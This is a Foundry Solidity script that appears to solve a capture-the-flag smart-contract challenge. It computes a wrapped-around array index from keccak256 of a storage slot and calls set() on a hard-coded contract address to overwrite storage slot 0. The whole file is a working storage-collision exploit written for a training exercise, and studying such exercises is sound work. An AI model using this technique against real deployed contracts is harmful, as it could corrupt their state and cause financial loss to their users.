pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../../src/math-challenge/Mapping.sol";

contract MyScript is Script {

    function run() public {

        vm.startBroadcast();

        IMappingChallenge mc = IMappingChallenge(0xdCf8771dcF37eaC3c9a5D5Dd8A7561C1154F875c);

        uint256 index = type(uint256).max - uint256(keccak256(abi.encode(bytes32(uint256(1))))) + 1;

        mc.set(index, 1);

        vm.stopBroadcast();

    }   

}